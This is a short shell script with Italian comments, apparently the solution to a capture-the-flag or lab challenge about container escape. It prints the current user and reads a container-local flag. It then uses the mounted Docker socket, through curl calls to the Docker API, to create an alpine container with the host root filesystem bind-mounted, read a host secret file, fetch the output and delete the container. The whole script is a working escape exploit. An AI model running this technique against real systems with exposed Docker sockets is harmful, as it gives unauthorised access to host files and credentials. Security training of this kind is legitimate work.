#!/bin/sh
echo "[stage1] shell nel container come: $(id)"
echo "[stage1] flag container-local:"
cat /app_flag.txt
echo "[stage2a] lettura diretta della flag host (atteso: errore):"
cat /host_flag_secret.txt 2>&1
echo "[stage2b] escape via socket Docker:"
SOCK=/var/run/docker.sock
API=http://localhost
CID=$(curl -s -XPOST --unix-socket "$SOCK" -H 'Content-Type: application/json' \
  -d '{"Image":"alpine:latest","Cmd":["cat","/host/host_flag_secret.txt"],"Tty":true,"HostConfig":{"Binds":["/:/host"]}}' \
  "$API/containers/create" | python3 -c 'import sys,json;print(json.load(sys.stdin)["Id"])' 2>/dev/null)
[ -z "$CID" ] && { echo "[!] creazione container fallita"; exit 1; }
curl -s -XPOST --unix-socket "$SOCK" "$API/containers/$CID/start" >/dev/null
curl -s -XPOST --unix-socket "$SOCK" "$API/containers/$CID/wait"  >/dev/null
curl -s --unix-socket "$SOCK" "$API/containers/$CID/logs?stdout=1&stderr=1"
curl -s -XDELETE --unix-socket "$SOCK" "$API/containers/$CID" >/dev/null
exit
